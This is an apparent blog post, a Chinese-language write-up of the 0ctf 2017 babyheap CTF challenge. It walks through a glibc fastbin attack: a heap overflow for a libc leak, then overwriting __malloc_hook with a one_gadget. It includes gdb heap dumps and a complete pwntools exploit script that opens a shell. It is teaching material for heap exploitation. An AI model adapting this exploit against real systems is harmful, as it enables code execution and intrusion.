@@ -1,0 +1,423 @@
+---
+title: CTF | 0ctf 2017 babyheap 
+date: 2018-09-25 10:42:41
+tags:
+---
+`0ctf 2017 babyheap writeup`
+有关 `fastbin attack` 利用
+<!-- more -->
+
+稍微复习一下 `fastbin attack`
+利用思路：
+1. 覆盖 `got` 表劫持控制流
+2. 覆盖栈上函数返回地址，然后ROP劫持控制流
+3. 覆盖 `malloc_hook`、覆盖 `_IO_FILE` 等方式劫持控制流
+没有开 FULL RELRO 的话，就可以考虑修改 got 表内容
+
+
+
+算是很经典的一道题了吧
+先分析一下程序
+**allocate**:  
+最大0x1000
+
+**fill**   关键！  
+没有设置字符串结尾，而且长度并不是之前 chunk 分配时指定的长度，是自己指定的，所以这里就出现了任意堆溢出的情形。可以用来泄露libc地址，以及构造fake chunk
+
+**dump**  
+输出对应chunk的内容
+
+**free**  
+释放堆块，清空 `inuse,size,ptr`
+
+chunk 结构:
+```
++---------|---------+
+|prev_size|  size   |
+|---------|---------|
+|   fd    |   bk    |
+|---------|---------|
+|       data        |
++---------|---------+
+```
+```
+chunk 包含三个字段：
+inuse
+size
+ptr
+```
+
+题目中 `fill` 存在堆溢出，可以写任意长度，注意分配使用的 `calloc` ，在分配的时候会将分配出来的 `chunk` `先清空，dump` 的大小是根据 `alloc` 指定的 `size` 决定的，跟真正的 `chunk` 大小无关。
+
+检查保护
+```
+[*] '/home/yuuoniy/Desktop/201809/babyheap'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+不能直接修改 `got`。。所以思路应该是 修改 `malloc__hook` 或 `__free__hook`
+
+**利用思路** 
+关键
+1. 泄露 `libc` 地址：从而得到 `malloc_hook` ,`one_gadget` 的地址
+2. 劫持控制流：通过修改` malloc_hook` 到 `one_gadget` 地址，就可以劫持控制流，因此可以通过 `fastbin attack` ，达到任意地址写
+
+利用堆溢出我们可以修改 `size`，从而达到 `chunk overlapping,`再通过 `dump` 就可以获取堆块的` fd,bk` 从而得到 `libc` 地址
+
+可以看一下 `glibc` 中 `__libc_free` 的实现
+注意 `free` 的时候会检查 `nextsize` 是否合法,所以我们需要伪造 `nextsize`
+```c
+   if (__glibc_unlikely (!prev_inuse(nextchunk)))
+      malloc_printerr ("double free or corruption (!prev)");
+    nextsize = chunksize(nextchunk);
+    if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0)
+        || __builtin_expect (nextsize >= av->system_mem, 0))
+      malloc_printerr ("free(): invalid next size (normal)");
+```
+构造 `chunk` 的 `layout` 还是有点难...参考了一下别人的思路， 劫持控制流的操作比较常规
+如果分配出来的 chunk 的 size 不属于这个 fastbin，那么会出现memory corruption(fast) 的错误。通过修改 fd 进入 fastbin 的 chunk 并没有进行对齐检测，所以我们可以利用没有对齐的数据来通过这个检测
+
+```c
+ victim = *fb;
+      if (victim != NULL)
+        {
+          if (SINGLE_THREAD_P)
+            *fb = victim->fd;
+          else
+            REMOVE_FB (fb, pp, victim);
+          if (__glibc_likely (victim != NULL))
+            {
+              size_t victim_idx = fastbin_index (chunksize (victim));
+              if (__builtin_expect (victim_idx != idx, 0))
+                malloc_printerr ("malloc(): memory corruption (fast)");
+```
+
+### 泄露 libc 
+
+
+首先`alloc(0x60)` `alloc(0x40)` 分配两个堆块 分别标记为 0 1
+```c
+gef➤  x/32gx 0x0000555c81913000
+0x555c81913000:	0x0000000000000000	0x0000000000000071 <= chunk 0 header 
+0x555c81913010:	0x0000000000000000	0x0000000000000000
+0x555c81913020:	0x0000000000000000	0x0000000000000000
+0x555c81913030:	0x0000000000000000	0x0000000000000000
+0x555c81913040:	0x0000000000000000	0x0000000000000000
+0x555c81913050:	0x0000000000000000	0x0000000000000000
+0x555c81913060:	0x0000000000000000	0x0000000000000000 <= chunk 1 header
+0x555c81913070:	0x0000000000000000	0x0000000000000051
+0x555c81913080:	0x0000000000000000	0x0000000000000000
+0x555c81913090:	0x0000000000000000	0x0000000000000000
+0x555c819130a0:	0x0000000000000000	0x0000000000000000
+0x555c819130b0:	0x0000000000000000	0x0000000000000000
+0x555c819130c0:	0x0000000000000000	0x0000000000020f41 <= top chunk
+0x555c819130d0:	0x0000000000000000	0x0000000000000000
+0x555c819130e0:	0x0000000000000000	0x0000000000000000
+0x555c819130f0:	0x0000000000000000	0x0000000000000000
+
+```
+
+`fill(0, 0x60 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71))`
+ 通过栈溢出修改 `chunk 1` 的 `size` 为 `0x70`
+ ```c
+ gef➤  x/32gx 0x000055ca12def000
+0x55ca12def000:	0x0000000000000000	0x0000000000000071 =>chunk 0 header
+0x55ca12def010:	0x6161616161616161	0x6161616161616161
+0x55ca12def020:	0x6161616161616161	0x6161616161616161
+0x55ca12def030:	0x6161616161616161	0x6161616161616161
+0x55ca12def040:	0x6161616161616161	0x6161616161616161
+0x55ca12def050:	0x6161616161616161	0x6161616161616161
+0x55ca12def060:	0x6161616161616161	0x6161616161616161
+0x55ca12def070:	0x0000000000000000	0x0000000000000071 =>chunk 1 size 被修改为0x70了
+0x55ca12def080:	0x0000000000000000	0x0000000000000000
+0x55ca12def090:	0x0000000000000000	0x0000000000000000
+0x55ca12def0a0:	0x0000000000000000	0x0000000000000000
+0x55ca12def0b0:	0x0000000000000000	0x0000000000000000
+0x55ca12def0c0:	0x0000000000000000	0x0000000000020f41
+0x55ca12def0d0:	0x0000000000000000	0x0000000000000000
+```
+
+`alloc(0x100) # 2`: 
+
+```c
+gef➤  x/32gx 0x000055dc9b1b8000
+0x55dc9b1b8000:	0x0000000000000000	0x0000000000000071 => chunk 0 header
+0x55dc9b1b8010:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8020:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8030:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8040:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8050:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8060:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8070:	0x0000000000000000	0x0000000000000071 => chunk 1 header (注意原本的size是0x51)
+0x55dc9b1b8080:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b8090:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b80a0:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b80b0:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b80c0:	0x0000000000000000	0x0000000000000111 => chunk 2  header
+0x55dc9b1b80d0:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b80e0:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b80f0:	0x0000000000000000	0x0000000000000000
+```
+
+`fill(2, 0x20, 'c' * 0x10 + p64(0) + p64(0x71)) `
+在 chunk2 中构造一个 fake chunk header
+
+```c
+gef➤  x/32gx 0x000055dc9b1b8000
+0x55dc9b1b8000:	0x0000000000000000	0x0000000000000071 => chunk 0
+0x55dc9b1b8010:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8020:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8030:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8040:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8050:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8060:	0x6161616161616161	0x6161616161616161
+0x55dc9b1b8070:	0x0000000000000000	0x0000000000000071 => chunk 1 
+0x55dc9b1b8080:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b8090:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b80a0:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b80b0:	0x0000000000000000	0x0000000000000000
+0x55dc9b1b80c0:	0x0000000000000000	0x0000000000000111 => chunk 2
+0x55dc9b1b80d0:	0x6363636363636363	0x6363636363636363
+0x55dc9b1b80e0:	0x0000000000000000	0x0000000000000071 => fake chunk size
+0x55dc9b1b80f0:	0x0000000000000000	0x0000000000000000
+```
+
+ 
+`free(1)`,添加 chunk 1添加到 `fastbin` 中，注意 size 是 `0x70`,包括了 `chunk 2` 的一部分
+```c
+  Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x55d152149080, size=0x70, flags=PREV_INUSE) 
+```
+
+将 刚 free 掉的chunk 1 malloc 出来,里面的内容被清空了
+alloc(0x60)
+
+```c
+gef➤  x/16gx 0x00005565fc9ce000
+0x5565fc9ce000:	0x0000000000000000	0x0000000000000071 => chunk 0
+0x5565fc9ce010:	0x6161616161616161	0x6161616161616161
+0x5565fc9ce020:	0x6161616161616161	0x6161616161616161
+0x5565fc9ce030:	0x6161616161616161	0x6161616161616161
+0x5565fc9ce040:	0x6161616161616161	0x6161616161616161
+0x5565fc9ce050:	0x6161616161616161	0x6161616161616161
+0x5565fc9ce060:	0x6161616161616161	0x6161616161616161
+0x5565fc9ce070:	0x0000000000000000	0x0000000000000071 => chunk 1
+gef➤  
+0x5565fc9ce080:	0x0000000000000000	0x0000000000000000
+0x5565fc9ce090:	0x0000000000000000	0x0000000000000000
+0x5565fc9ce0a0:	0x0000000000000000	0x0000000000000000
+0x5565fc9ce0b0:	0x0000000000000000	0x0000000000000000
+0x5565fc9ce0c0:	0x0000000000000000	0x0000000000000000
+0x5565fc9ce0d0:	0x0000000000000000	0x0000000000000000
+0x5565fc9ce0e0:	0x0000000000000000	0x0000000000000071 => chunk 2 fake header 
+0x5565fc9ce0f0:	0x0000000000000000	0x0000000000000000
+```
+
+`fill(1, 0x40 + 0x10, 'b' * 0x40 + p64(0) + p64(0x111))` ：
+恢复 chunk2 的头
+```c
+gef➤  x/32gx 0x565289992010-0x10
+0x565289992000:	0x0000000000000000	0x0000000000000071 => chunk 0
+0x565289992010:	0x6161616161616161	0x6161616161616161
+0x565289992020:	0x6161616161616161	0x6161616161616161
+0x565289992030:	0x6161616161616161	0x6161616161616161
+0x565289992040:	0x6161616161616161	0x6161616161616161
+0x565289992050:	0x6161616161616161	0x6161616161616161
+0x565289992060:	0x6161616161616161	0x6161616161616161
+0x565289992070:	0x0000000000000000	0x0000000000000071 => chunk 1 
+0x565289992080:	0x6262626262626262	0x6262626262626262
+0x565289992090:	0x6262626262626262	0x6262626262626262
+0x5652899920a0:	0x6262626262626262	0x6262626262626262
+0x5652899920b0:	0x6262626262626262	0x6262626262626262 
+0x5652899920c0:	0x0000000000000000	0x0000000000000111 => chunk 2 header 
+0x5652899920d0:	0x0000000000000000	0x0000000000000000
+0x5652899920e0:	0x0000000000000000	0x0000000000000071 => fake chunk 2 header  
+```
+```python
+alloc(0x50) # 3  
+free(2) # free 2   
+```
+为了避免 `free(2)` 和` top chunk `合并，我们先 `alloc(0x50)  `
+`free` 之后：
+`[+] unsorted_bins[0]: fw=0x5642e5bb10c0, bk=0x5642e5bb10c0
+ →   Chunk(addr=0x5642e5bb10d0, size=0x110, flags=PREV_INUSE)`
+
+chunk 2 写入了 fd,bk 通过 `dump chunk 1` 我们就可以得到 main_arena+88 的地址
+```c
+gef➤  x/32gx 0x00005642e5bb1000
+0x5642e5bb1000:	0x0000000000000000	0x0000000000000071 => chunk 0
+0x5642e5bb1010:	0x6161616161616161	0x6161616161616161
+0x5642e5bb1020:	0x6161616161616161	0x6161616161616161
+0x5642e5bb1030:	0x6161616161616161	0x6161616161616161
+0x5642e5bb1040:	0x6161616161616161	0x6161616161616161
+0x5642e5bb1050:	0x6161616161616161	0x6161616161616161
+0x5642e5bb1060:	0x6161616161616161	0x6161616161616161
+0x5642e5bb1070:	0x0000000000000000	0x0000000000000071 => chunk 1 header 
+0x5642e5bb1080:	0x6262626262626262	0x6262626262626262
+0x5642e5bb1090:	0x6262626262626262	0x6262626262626262
+0x5642e5bb10a0:	0x6262626262626262	0x6262626262626262
+0x5642e5bb10b0:	0x6262626262626262	0x6262626262626262
+0x5642e5bb10c0:	0x0000000000000000	0x0000000000000111 => chunk 2 
+0x5642e5bb10d0:	0x00007f99f3137b78	0x00007f99f3137b78 => fd bk 
+0x5642e5bb10e0:	0x0000000000000000	0x0000000000000071
+0x5642e5bb10f0:	0x0000000000000000	0x0000000000000000
+```
+
+ main_arena+88
+```c
+gef➤  x/16gx 0x00007f99f3137b78
+0x7f99f3137b78 <main_arena+88>:	0x00005642e5bb1230	0x0000000000000000
+0x7f99f3137b88 <main_arena+104>:	0x00005642e5bb10c0	0x00005642e5bb10c0
+0x7f99f3137b98 <main_arena+120>:	0x00007f99f3137b88	0x00007f99f3137b88
+0x7f99f3137ba8 <main_arena+136>:	0x00007f99f3137b98	0x00007f99f3137b
+```
+
+泄露计算得到 `libc` 基址
+### 修改控制流
+通过堆溢出修改 `chunk 1` 的 fd 指针指向 `malloc_hook`  附近
+```python
+free(1)
+payload = 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0)
+    fill(0, 0x60 + 0x10 + 0x10, payload)
+```
+会将 `chunk 1` 放入 `fastbin` ，再通过堆溢出修改 `chunk 1`的 `fd` 指针到 `malloc_hook` 附近
+此时 `fastbin`:
+`Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x559f678d8080, size=0x70, flags=PREV_INUSE) `
+```c
+gef➤  x/32gx 0x000056471f81c000
+0x56471f81c000:	0x0000000000000000	0x0000000000000071  => chunk 0 
+0x56471f81c010:	0x6161616161616161	0x6161616161616161
+0x56471f81c020:	0x6161616161616161	0x6161616161616161
+0x56471f81c030:	0x6161616161616161	0x6161616161616161
+0x56471f81c040:	0x6161616161616161	0x6161616161616161
+0x56471f81c050:	0x6161616161616161	0x6161616161616161
+0x56471f81c060:	0x6161616161616161	0x6161616161616161
+0x56471f81c070:	0x0000000000000000	0x0000000000000071 => chunk 1
+0x56471f81c080:	0x00007fbfe59beaed	0x0000000000000000 => fake fd
+0x56471f81c090:	0x6262626262626262	0x6262626262626262
+0x56471f81c0a0:	0x6262626262626262	0x6262626262626262
+0x56471f81c0b0:	0x6262626262626262	0x6262626262626262
+0x56471f81c0c0:	0x0000000000000000	0x0000000000000111 => chunk 2
+0x56471f81c0d0:	0x00007fbfe59beb78	0x00007fbfe59beb78
+0x56471f81c0e0:	0x0000000000000000	0x0000000000000071
+0x56471f81c0f0:	0x0000000000000000	0x0000000000000000
+```
+
+可以看一下
+```c
+gef➤  x/16gx 0x00007fbfe59beaed
+0x7fbfe59beaed <_IO_wide_data_0+301>:	0xbfe59bd260000000	0x000000000000007f
+0x7fbfe59beafd:	0xbfe567fe20000000	0xbfe567fa0000007f
+0x7fbfe59beb0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
+0x7fbfe59beb1d:	0x0000000000000000	0x0000000000000000
+```
+```
+alloc(0x60)  
+alloc(0x60) 
+```
+第一次分配刚刚 `free` 掉的 `chunk 1`,第二次就会分配到 `malloc_hook` 附近了  
+注：`fd = malloc_hook - 27 - 0x8`, 分配的时候会将` malloc_hook - 27 - 0x8+0x10` 分配出去，也就是 `malloc_hook-1`9 因此我们先写`'a'*3 +p64(0)*2`
+再写入 `one_gadget`,刚好会写到 `malloc_hook` 处 
+
+```c
+gef➤  x/16gx 0x7efd4e6aab10-27-5
+0x7efd4e6aaaf0 <_IO_wide_data_0+304>:	0x00007efd4e6a9260	0x0000000000000000
+0x7efd4e6aab00 <__memalign_hook>:	0x0000000000000000	0x0000000000000000
+0x7efd4e6aab10 <__malloc_hook>:	0x00007efd4e32b26a	0x0000000000000000
+0x7efd4e6aab20 <main_arena>:	0x0000000000000000	0x0000000000000000
+0x7efd4e6aab30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
+0x7efd4e6aab40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
+```
+成功修改 ` malloc hook`, `0x00007efd4e32b26a` 就是 `one_gadget` 的地址
+ps: 上面贴的信息不是同一次脚本跑出来的...所以有些地方地址不太一样，理解就好...嘻嘻(我还是不知道怎么早脚本中多次用gdb调试？？每次调试一回来就超时了...)
+最终 payload
+```python
+from pwn import *
+context(log_level='debug')
+
+DEBUG = 1
+if DEBUG:
+    p = process('./babyheap')
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
+else:
+    p = remote()
+
+def alloc(size):
+    p.recvuntil('Command:')
+    p.sendline('1')
+    p.recvuntil('Size:')
+    p.sendline(str(size))
+
+def fill(index, size, content):
+    p.recvuntil('Command:')
+    p.sendline('2')
+    p.recvuntil('Index:')
+    p.sendline(str(index))
+    p.recvuntil('Size:')
+    p.sendline(str(size))
+    p.recvuntil('Content:')
+    p.send(content)
+
+def free(index):
+    p.recvuntil('Command:')
+    p.sendline('3')
+    p.recvuntil('Index:')
+    p.sendline(str(index))
+
+def dump(index):
+    p.recvuntil('Command:')
+    p.sendline('4')
+    p.recvuntil('Index:')
+    p.sendline(str(index))
+    p.recvuntil('Content: \n')
+    return p.recvline()[:-1]
+
+def leak():
+    alloc(0x60) # 0
+    alloc(0x40) # 1
+    fill(0, 0x60 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71))
+    alloc(0x100) # 2
+    fill(2, 0x20, 'c' * 0x10 + p64(0) + p64(0x71))
+    free(1)  # free 1
+    alloc(0x60) # alloc 1
+    fill(1, 0x40 + 0x10, 'b' * 0x40 + p64(0) + p64(0x111))
+    alloc(0x50) # 3
+    free(2) # free 2
+    leaked = u64(dump(1)[-8:])
+    # return libc_base
+    return leaked -0x3c4b20-88
+
+
+def fastbin_attack(libc_base):
+    malloc_hook = libc.symbols['__malloc_hook'] + libc_base
+    execve_addr = 0x4526a + libc_base
+
+    log.info("malloc_hook @" + hex(malloc_hook))
+    free(1)
+    payload = 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0)
+    fill(0, 0x60 + 0x10 + 0x10, payload)
+    alloc(0x60)
+    alloc(0x60)
+    payload  = 'a' * 3
+    payload += p64(0) * 2
+    payload += p64(execve_addr)
+    fill(2, len(payload), payload)
+    gdb.attach(p)
+    alloc(0x20)
+
+def main():
+    libc_base = leak()
+    log.info("get libc_base:" + hex(libc_base))
+    fastbin_attack(libc_base)
+    p.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+### 参考链接  
+https://blog.csdn.net/qq_29343201/article/details/66476135
+https://blog.csdn.net/qq_33528164/article/details/79515761
+
